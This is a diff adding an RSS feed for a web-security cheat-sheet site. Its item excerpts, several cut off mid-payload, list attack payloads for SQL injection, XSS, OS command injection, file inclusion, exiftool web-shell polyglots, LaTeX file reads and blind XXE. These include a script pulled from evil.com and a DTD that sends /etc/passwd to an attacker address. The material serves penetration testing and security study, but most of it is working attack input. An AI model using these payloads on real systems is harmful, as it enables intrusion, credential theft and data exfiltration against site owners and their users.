@@ -1,0 +1,299 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Security Risk on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/web/security-risk/</link>
+    <description>Recent content in Security Risk on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:58:00 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/web/security-risk/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SQL Injection Cheat Sheet</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/</guid>
+      <description>Comment Syntax linkComment syntax is depending on the database used in the website.&#xA;MSDB Comments MySQL -- - (add a space after --) # /*comment*/ /*!comment*/ MSSQL -- /*comment*/ Oracle -- PostgreSQL -- /*comment*/ SQLite -- /*comment*/ Basic Injection linkFirst off, check if we can inject SQL commands into forms or URL params in the target website.&#xA;&amp;#39; OR 1=1-- &amp;#39; OR 1=1-- - &amp;#39; OR 1=1# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1# &amp;#34; OR 1=1-- &amp;#34; OR 1=1-- - &amp;#34; OR 1=1# &amp;#39;) OR 1=1-- &amp;#39;) OR 1=1-- - &amp;#39;) OR 1=1# &amp;#39;; OR 1=1-- &amp;#39;; OR 1=1-- - &amp;#39;; OR 1=1# admin or 1=1-- admin or 1=1-- - admin or 1=1# WAF Bypass linkReference: https://owasp.</description>
+    </item>
+    <item>
+      <title>XSS (Cross-Site Scripting)</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xss/</link>
+      <pubDate>Tue, 28 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xss/</guid>
+      <description>Payloads linkWe can insert them into URL params, POST params or HTTP headers.&#xA;Additionary, we can also find CVE related XSS here.&#xA;Script Tags link &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#39;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;onerror=alert;throw 123&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;{onerror=alert}throw 123&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;throw onerror=alert,&amp;#39;hello&amp;#39;,123,&amp;#39;world&amp;#39;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;fetch(&amp;#39;/profile?new_password=password&amp;#39;);&amp;lt;/script&amp;gt; &amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; %3Cscript%3Ealert%281%29%3C%2Fscript%3E &amp;#39;;alert(1);&amp;#39; In addition, we may be able to execute our JavaScript file which is hosted on our server.&#xA;&amp;lt;script src=&amp;#34;https://evil.com/evil.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; Img Tags link &amp;#34; src=1 onerror=alert(1)&amp;gt; &amp;lt;&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;#34;&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;lt;img src=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav&amp;amp;#x09;ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav&amp;amp;#x0A;ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img dynsrc=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img lowsrc=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=http://10.</description>
+    </item>
+    <item>
+      <title>Broken Access Control</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/broken-access-control/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/broken-access-control/</guid>
+      <description>Change Header Values linkCookie linkWe may be able to get access to the login-required pages.&#xA;Cookie: admin=true Cookie: isAdmin=true Cookie: access=1 Cookie: access=true # Insert another user value Cookie: session=&amp;lt;another_user_value&amp;gt; Cookie: access_token=&amp;lt;another_user_value&amp;gt; IP Spoofing link Cluster-Client-IP: 127.0.0.1 Forwarded-For: 127.0.0.1 X-Forwarded: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Original-URL: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-ProxyUser-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Remote-IP: 127.0.0.1 Host: 127.0.0.1 User Agent linkSometimes we can access another server by replacing the User Agent with the specific one.</description>
+    </item>
+    <item>
+      <title>File Upload Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack/</guid>
+      <description>Check Allowed File Formats linkFirst off, we need to know what file types are allowed to be uploaded in target website.&#xA;Try to upload any formats.&#xA;.php, .php3, .php4, .php5, .phtml, .phar .jpg, jpeg, .png, .gif .bmp .pdf .js .exe, .dll, .asp, .aspx .py .go .rs Create Blank Files for Each Format linkTo create a blank file for the checking purpose, execute the following command.&#xA;jpg, png # https://superuser.com/questions/294943/is-there-a-utility-to-create-blank-images convert -size 32x32 xc:white test.</description>
+    </item>
+    <item>
+      <title>OS Command Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</guid>
+      <description>Basic Payloads linkIf the payload includes whitespaces (&amp;rsquo; &amp;lsquo;), we need to change it to &amp;rsquo;+&amp;rsquo; or URL encoding (&amp;rsquo;%20&amp;rsquo;).&#xA;/api/cmd/whoami /command/whoami /?cmd=whoami /?cmd=;id /?cmd=ls /?cmd=ls .. /?cmd=ls ../ /?cmd=ls /home /?cmd=`ping -c 1 10.0.0.1` /?file=example.txt; echo $(ls -al /) /?file=example.txt; echo $(ls -al /) | &amp;lt;!-- PHP query string --&amp;gt; /?q=;system($_GET[cmd])&amp;amp;cmd=whoami /?q=${system($_GET[cmd])}&amp;amp;cmd=whoami /?productId=1&amp;amp;stockId=1|whoami /?productId=1&amp;amp;stockId=1|id &amp;lt;!-- Windows --&amp;gt; /?file=example.txt | systeminfo # /?file=example.txt ; systeminfo # /?file=example.txt&amp;#39;) ; systeminfo # URL Encoding linkWe may be able to bypass specific character filter by encoding them.</description>
+    </item>
+    <item>
+      <title>SSRF (Server-Side Request Forgery)</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/ssrf/</link>
+      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/ssrf/</guid>
+      <description>SSRF Capture Tools linkIf we want to capture incoming requests from target website/server, there is a lot of open-source tools available.&#xA;Ngrok linkhttps://ngrok.com/&#xA;To start ngrok server, run the following.&#xA;ngrok http 80 # Force http scheme (not https) ngrok http --scheme=http 8090 --host-header=localhost:8090 Then start your local web server for fetching requests forwarded from the ngrok server.&#xA;sudo python3 -m http.server 80 # or python3 -m http.server 8090 After starting ngrok and local web server, we can use the URL such as https://abcd-12-3-45-678.</description>
+    </item>
+    <item>
+      <title>SSTI (Server-Side Template Injection)</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/ssti/</link>
+      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/ssti/</guid>
+      <description>Automation linkTplmap is a program for Server-Side Template Injection and Code Injection.&#xA;./tplmap.py -u http://vulnerable.com/?name=test Identify the Template Engine/Framework/Language link Payload Template Engine/Framework/Language a{*comment*}b Smarty #{ 2*3 } Pug, Spring *{ 2*3 } Spring ${&amp;quot;z&amp;quot;.join(&amp;quot;ab&amp;quot;)} Mako, ??? {{ &#39;7&#39;*7 }} Angular, Django, Flask, Go, Jinja2, Tornado, Twig, ??? {{:2*3}} JsRender {% debug %} Django SSTI for Each Framework linkPlease see each article for details about SSTI.&#xA;Angular Django Flask/Jinja2 Go JsRender Pug Spring Tornado </description>
+    </item>
+    <item>
+      <title>Web Cache Poisoning</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/web-cache-poisoning/</link>
+      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/web-cache-poisoning/</guid>
+      <description>Reflected XSS with Cache Poisoning linkIf the website reflects our arbitrary path in the result such as below.&#xA;https://example.com/xyz # Output in the 404 page Page not found: /xyz We may try XSS as below.&#xA;https://example.com/xyz&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; If we use Burp Repeater to send the request above, the URL won&amp;rsquo;t be normalized so leads the reflected XSS. Then the cache will be poisoned. In this state, if you ask the victim to visit this URL, they will see this cached result.</description>
+    </item>
+    <item>
+      <title>HTTP Request Smuggling</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/http-request-smuggling/</link>
+      <pubDate>Sat, 14 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/http-request-smuggling/</guid>
+      <description>Investigation linkAssume the website has the following HTTP specification.&#xA;POST /login HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Content-Length: 29 username=admin&amp;amp;password=admin If we change &amp;ldquo;Content-Length&amp;rdquo; to &amp;ldquo;Transfer-Encoding&amp;rdquo; as follow, the data is sent in chunks to server. Each chunk consists of the chunk size in bytes (it is expressed in hexadecimal).&#xA;The message is terminated with a chunk of size zero.&#xA;POST /login HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Transfer-Encoding: chunked 1d username=admin&amp;amp;password=admin 0 By the way, Transfer-Encoding header is not allowed in HTTP/2.</description>
+    </item>
+    <item>
+      <title>NoSQL Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/nosql-injection/</link>
+      <pubDate>Thu, 05 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/nosql-injection/</guid>
+      <description>Manual Injection linkSee also Web Login Bypass NoSQL Injection.&#xA;Mongo linkIf the web application uses MongDB, you might be able to fetch the user&amp;rsquo;s information.&#xA;It allows you to bypass authentication.&#xA;/?username=admin&amp;amp;password[$ne]=xyz /?username[$ne]=admin&amp;amp;role=guest /?id[$gt]=1&amp;amp;username=john Syntax&#xA;Below are the payloads to syntax injection. Don’t forget to try the URL-encoded payloads.&#xA;test||1==1 test%7C%7C1%3D%3D1 test||1==1// test%7C%7C1%3D%3D1%2F%2F test||1==1%00 test%7C%7C1%3D%3D1%2500 test||1==1\u0000 test%7C%7C1%3D%3D1%5Cu0000 test||&amp;#39;1==1 test%7C%7C%271%3D%3D1 test||&amp;#39;1&amp;#39;==&amp;#39;1&amp;#39; test%7C%7C%271%27%3D%3D%271%27 test||&amp;#39;1&amp;#39;==&amp;#39;1 test%7C%7C%271%27%3D%3D%271 test&amp;#39;||1||&amp;#39; test%27%7c%7c%31%7c%7c%27 &amp;lt;!-- Find specific fields e.g. &amp;#39;password&amp;#39; --&amp;gt; admin&amp;#39; &amp;amp;&amp;amp; this.</description>
+    </item>
+    <item>
+      <title>File Inclusion (LFI/RFI)</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-inclusion/</link>
+      <pubDate>Mon, 02 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-inclusion/</guid>
+      <description>Local File Inclusion (LFI) link ?page=../ ?page=/etc/passwd ?page=../../../../etc/passwd ?page=../../../../../etc/passwd ?page=..//..//..//..//..//etc/passwd ?page=....//....//....//....//etc/passwd ?page=....//....//....//....//....//....//etc/passwd ?page=.....///.....///.....///.....///etc/passwd ?page=../../../../../../../../../../../../../../etc/passwd ?page=..\/..\/..\/..\/etc/passwd ?page=/etc/passwd&amp;amp; ?page=/etc/passwd%00 ?page=example.php%00.txt ?page=/etc/passwd%00.inc ?page=/etc/passwd%00.php ?page=http://localhost/index ?page=http://localhost:3000/index.html ?page=http://localhost:8000/index.html ?page=somedir/../../../../etc/passwd&amp;amp;ext= # URL encoding ?page=..%2F..%2F..%2F..%2Fetc/passwd ?page=..%5C..%5C..%5C..%5Cetc/passwd ?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd ?page=http:%5C%5Cindex # URL double encoding ?page=..%252F..%252F..%252F..%252fetc/passwd ?page=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd ?page=http:%252F%252Findex # UTF-8 encoding ?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd # Dot truncation ?page=../../../../etc/passwd.......................................................... # File scheme ?page=file:///etc/passwd ?page=file:%2F%2F%2Fetc%2Fpasswd ?page=file:%252F%252F%252Fetc%252Fpasswd ?page=file%3A///etc/passwd ?page=file%3A%2F%2F%2Fetc%2Fpasswd ?page=file%3A%252F%252F%252Fetc%252Fpasswd ?page=file://var/www/html/index.php ?page=file://var/www/&amp;lt;subdomain&amp;gt;/index.php # Other local web servr ?page=http://127.0.0.1/ ?page=http://127.0.0.1:3000/ ?page=http://127.0.0.1:8000/ # PHP Filter ?page=php://filter/resource=/etc/passwd ?page=php://filter/read=string.rot13/resource=index.php ?</description>
+    </item>
+    <item>
+      <title>SQL Injection with Sqlmap</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-with-sqlmap/</link>
+      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-with-sqlmap/</guid>
+      <description>Basic Usage link # GET request sqlmap -u &amp;#34;http://&amp;lt;target-ip&amp;gt;/?search=test&amp;#34; Using Burp Suite Request File linkWe can specify a request file which is downloaded from Burp Suite.&#xA;In Burp Suite, right-click on the HTTP request header screen, then click Save Item to download the request file. We can use it with SQLmap. Add the &amp;quot;-r&amp;quot; flag as below.&#xA;sqlmap -r request.txt In addition, we can see payloads to be tested in Burp Suite by setting the Burp proxy IP address to the --proxy flag.</description>
+    </item>
+    <item>
+      <title>Business Logic Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/business-logic-attack/</link>
+      <pubDate>Tue, 12 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/business-logic-attack/</guid>
+      <description>Change Request Params to Unexpected Values link productId=-1 productId=a productId= # empty value productId=1&amp;amp;price=-1000 Exploit Broken Two-Factor linkBrute force a MFA Code link POST /login HTTP/1.1 Cookie: verify=victim ... &amp;lt;!-- Brute force digits code --&amp;gt; mfa-code=1111 Loop Back with 2,147,483,647 linkNo contents yet.&#xA;Register with Too Long-Length Email Address link POST /register HTTP/1.1 ... username=attacker&amp;amp;password=pass1&amp;amp;email=aaaaaaaaaaaaa...aa@vulnerable.com.attacker.com Remove the Specific POST Params link POST /change-password HTTP/1.1 ... &amp;lt;!-- Remove &amp;#39;current-password&amp;#39; parameter --&amp;gt; username=admin&amp;amp;new-password-1=newpass&amp;amp;new-password-2=newpass </description>
+    </item>
+    <item>
+      <title>Redis SSRF</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/redis-ssrf/</link>
+      <pubDate>Sat, 09 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/redis-ssrf/</guid>
+      <description>Investigation linkIf the target server runs Redis server and the website interacts with the Redis server, we can modify the key value in the Redis and reflects the result through SSRF using gopher.&#xA;url=http://evil.com/ Exploitation linkAutomation linkWe can use Gopherus to create a payload.&#xA;Payload Manually linkTo make the payload for SSRF manually, we need to know what commands to insert.&#xA;To make it clear, try to demonstrate the command (RESP format) to update the target key value in Redis.</description>
+    </item>
+    <item>
+      <title>File Upload Attack on Exiftool</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-exiftool/</link>
+      <pubDate>Thu, 24 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-exiftool/</guid>
+      <description>Polyglot Attack linkWe might be able to execute remote code by polyglotting the original plain image file.&#xA;At first, create a blank image file as below, but this step may be not required if you already have some image file.&#xA;convert -size 32x32 xc:white test.jpg Then insert OS command with exiftool.&#xA;exiftool -Comment=&amp;#34;&amp;lt;?php system(&amp;#39;ls&amp;#39;); ?&amp;gt;&amp;#34; example.png exiftool -Comment=&amp;#39;&amp;lt;?php echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;; system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#39; exploit.png exiftool -Comment=&amp;#34;&amp;lt;?php echo &amp;#39;START &amp;#39; . file_get_contents(&amp;#39;/etc/passwd&amp;#39;) .</description>
+    </item>
+    <item>
+      <title>File Upload Attack on ImageMagick</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-imagemagick/</link>
+      <pubDate>Thu, 24 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-imagemagick/</guid>
+      <description>This page is no content yet, but please refer to the references below to achieve this attack.</description>
+    </item>
+    <item>
+      <title>IDOR (Insecure Direct Object References) Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/idor-attack/</link>
+      <pubDate>Tue, 22 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/idor-attack/</guid>
+      <description>Find Vulnerabilities from HTML Source Code linkFirst check values of attributes on input elements.&#xA;&amp;lt;input name=&amp;#34;user_id&amp;#34; value=&amp;#34;8&amp;#34; &amp;gt; Then try what will happen when you change the Cookie value in a HTTP header.&#xA;Cookie: user_id=12 Change GET Parameters linkManual link /user?id=1 /user?id=2 /user?id=-1 /user?id=00 /admin/posts/1 /admin/posts/-1 /admin/posts/00 /static/1.txt /static/2.txt /static/-1.txt /static/00.txt Automation link seq 0 100 | ffuf -u https://example.com/user?id=FUZZ -w - wfuzz -z file,./numbers.txt https://example.com/user?id=FUZZ Change POST Parameters link address=1&amp;amp;user_id=1 address=1&amp;amp;user_id=2 # URL Encode &amp;#39;&amp;amp;&amp;#39; address=1%26user_id=2 </description>
+    </item>
+    <item>
+      <title>Client-Side JavaScript Validation Bypass</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/client-side-javascript-validation-bypass/</link>
+      <pubDate>Fri, 18 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/client-side-javascript-validation-bypass/</guid>
+      <description>Investigation linkFor example, assume that website modifies user input then validation check when logged in as the following JavaScript (e.g. validation.js).&#xA;// validation.js function validate() { let username = document.getElementById(&amp;#34;username&amp;#34;).value; let password = document.getElementById(&amp;#34;password&amp;#34;).value; // Change the username input if it contains &amp;#34;admin&amp;#34; to confuse attackers. username = username.replace(/admin/g, &amp;#34;noob&amp;#34;); // If the input value of the username/password are both &amp;#34;admin&amp;#34;, we can bypass this validation. if (username === &amp;#34;admin&amp;#34; &amp;amp;&amp;amp; password === &amp;#34;admin&amp;#34;) { return true; } return false; } By the way, this example may not exist in real world because it’s too simple.</description>
+    </item>
+    <item>
+      <title>Web Race Condition Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/web-race-condition-attack/</link>
+      <pubDate>Mon, 14 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/web-race-condition-attack/</guid>
+      <description>Investigation linkIf target website has the functionality that logged-in user can apply the 10% off code for buying products, the code must be applied only one time most of the time. However, this rule might be bypassed by exploiting race condition vulnerability with concurrent requests.&#xA;Race Condition Attack using Turbo Intruder in Burp Suite linkWe can easily achieve race condition attack by using Turbo Intruder.&#xA;In Burp Suite, right-click on specific request.</description>
+    </item>
+    <item>
+      <title>Prototype Pollution in Server-Side</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</link>
+      <pubDate>Fri, 11 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</guid>
+      <description>Investigation linkIf the properties is affected by our pollution, our polluted properties might be injected into the target object as follow.&#xA;POST /user/update HTTP/1.1 Host: example.com ... { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__proto__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Other option { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;constructor&amp;#34;: { &amp;#34;prototype&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } } // Bypass sanitization 1 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__pro__proto__to__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Bypass sanitization 2 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.</description>
+    </item>
+    <item>
+      <title>Prototype Pollution in Client-Side</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-client-side/</link>
+      <pubDate>Mon, 03 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-client-side/</guid>
+      <description>Investigation linkCheck if we can assign arbitrary property via URL.&#xA;Try various ways.&#xA;https://example.com/?__proto__[foo]=bar https://example.com/?__proto__.foo=bar https://example.com/?constructor.[prototype][foo]=bar https://example.com/?constructor.prototype.foo=bar # Bypass sanitization https://example.com/?__pro__proto__to__[foo]=bar https://example.com/?__pro__proto__to__.foo=bar https://example.com/?constconstructorructor[prototype][foo]=bar https://example.com/?constconstructorructor.prototype.foo=bar https://example.com/?constconstructorructor[protoprototypetype][foo]=bar https://example.com/?constconstructorructor.protoprototypetype.foo=bar Open browser console, and type the following to check if our above property is assigned.&#xA;Object.prototype.foo constructor.prototype.foo // the expected output: &amp;#34;bar&amp;#34; DOM XSS linkIf our payload affects an HTML element after loading, we can inject DOM-based XSS as below.&#xA;Assume the key name of the property is &amp;ldquo;source_url&amp;rdquo;, whose value is loaded as &amp;ldquo;src&amp;rdquo; in a script element.</description>
+    </item>
+    <item>
+      <title>SQL Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection/</link>
+      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection/</guid>
+      <description>Identify Where SQL Injection can be Performed linkThere are many places where SQLi can be performed. For example,&#xA;URL parameters POST parameters HTTP request headers (Cookie, User-Agent, etc.) Cheat Sheet linkTo see SQL injection cheat sheet, please refer to this page.</description>
+    </item>
+    <item>
+      <title>LaTeX Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/latex-injection/</link>
+      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/latex-injection/</guid>
+      <description>Payloads - Read Files link # Read file \input{/etc/passwd} $\input{/etc/passwd}$ $$\input{/etc/passwd}$$ \include{example} # Read example.tex $\include{example}$ $$\include{example}$$ \lstinputlisting{/etc/passwd} $\lstinputlisting{/etc/passwd}$ $$\lstinputlisting{/etc/passwd}$$ Payloads - Write File link \newwrite\outfile $\newwrite\outfile$ $$\newwrite\outfile$$ \openout\outfile=cmd.tex $\openout\outfile=cmd.tex$ $$\openout\outfile=cmd.tex$$ \write\outfile{Hello-World} $\write\outfile{Hello-World}$ $$\write\outfile{Hello-World}$$ </description>
+    </item>
+    <item>
+      <title>DOM Cloberring</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/dom-cloberring/</link>
+      <pubDate>Thu, 15 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/dom-cloberring/</guid>
+      <description>Basic Exploitation linkIf the website adds the JavaScript code into the DOM when loading page as below,&#xA;window.onload = function() { let someObj = window.someObj || {}; let script = document.createElement(&amp;#39;script&amp;#39;); script.src = someObj.url; document.body.appendChild(script); } We may manipulate this someObj and override the properties (url here) using anchor elements, then we can execute arbitrary JavaScript code.&#xA;For example, insert the following code in the comment, search, etc. in the target website.</description>
+    </item>
+    <item>
+      <title>Open Redirect</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/open-redirect/</link>
+      <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/open-redirect/</guid>
+      <description>Payloads link https://vulnerable.com/example.php?redirectUrl=https://attacker.com/ https://vulnerable.com/example.php?redirectUrl=https:\\attacker.com\ https://vulnerable.com/example.php?redirectUrl=https://attacker.com#.vulnerable.com/ &amp;lt;!-- &amp;#34;%E3%80%82&amp;#34; is &amp;#34;.&amp;#34; --&amp;gt; https://vulnerable.com/example.php?redirectUrl=https://attacker.com%E3%80%82%23.vulnerable.com/ &amp;lt;!-- &amp;#34;%0d&amp;#34; is newline --&amp;gt; https://vulnerable.com/example.php?redirectUrl=/%0d/attacker.com/ Unrestricted QR Code Scanning linkReference: https://shahjerry33.medium.com/open-redirection-qr-code-magic-18ace1a0170f&#xA;If website (or mobile application) has the function for scanning QR code but not restricts URL, we can let it to read malicious QR code.&#xA;1. Generate QR Code linkFirst, we need to create a malicious QR code. There are many online tools for generating it.&#xA;2. Read Malicious QR Code in the Application linkAfter generating the QR code, read the QR code in the target application.</description>
+    </item>
+    <item>
+      <title>Host Header Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/host-header-attack/</link>
+      <pubDate>Sun, 11 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/host-header-attack/</guid>
+      <description>Abuse Connection State linkIf the web server validates only the first request, we may be able to exploit the second request by keeping the connection and changing the Host header to the internal page.&#xA;1. Send the First Request link GET / HTTP/2 Host: example.com ... Connection: keep-alive 2. Send the Second Request. link POST /admin/change-email HTTP/2 Host: 192.168.0.1 email=admin@example.com&amp;amp;new_email_1=attacker@evil.com&amp;amp;new_email_2=attacker@evil.com As a result, we may be able to change the admin&amp;rsquo;s email to arbitrary email.</description>
+    </item>
+    <item>
+      <title>Blind XXE</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/blind-xxe/</link>
+      <pubDate>Sat, 10 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/blind-xxe/</guid>
+      <description>Data Exfiltration via Out-Of-Band link1. Create a Malicious DTD linkWe need to prepare the dtd file (named &amp;ldquo;exploit.dtd&amp;rdquo; here) to retrieve the target file.&#xA;Replace the ip address with your own.&#xA;&amp;lt;!ENTITY % file SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt; &amp;lt;!-- &amp;lt;!ENTITY % file SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=index.php&amp;#34; --&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY &amp;amp;#x25; exfiltrate SYSTEM &amp;#39;http://10.0.0.1/?x=%file;&amp;#39;&amp;gt;&amp;#34;&amp;gt; %eval; %exfiltrate; Then host it on web server.&#xA;sudo python3 -m http.server 80 2. Insert XXE linkIn http request body, insert the following XXE payload.</description>
+    </item>
+    <item>
+      <title>CSRF (Cross-Site Request Forgery)</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/csrf/</link>
+      <pubDate>Fri, 09 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/csrf/</guid>
